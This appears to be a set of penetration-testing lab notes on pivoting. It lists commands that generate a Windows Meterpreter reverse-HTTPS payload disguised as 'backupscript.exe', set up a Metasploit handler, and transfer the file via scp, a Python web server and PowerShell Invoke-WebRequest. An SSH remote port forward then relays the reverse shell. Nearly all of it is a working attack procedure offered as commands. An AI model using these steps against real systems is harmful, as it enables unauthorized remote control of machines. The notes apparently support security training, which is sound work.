
Create windows payload for rev shell
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```


Open metasploit and setup handler
```shell-session
msf6 > use exploit/multi/handler
```


Transferring files over ssh 
```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```


Starting python web server on pivot host to setup local transfer with powershell
```shell-session
python3 -m http.server 8123
```

Transferring file via powershell on pivot host
```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

SSH remote port forwarding on pivot host
```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

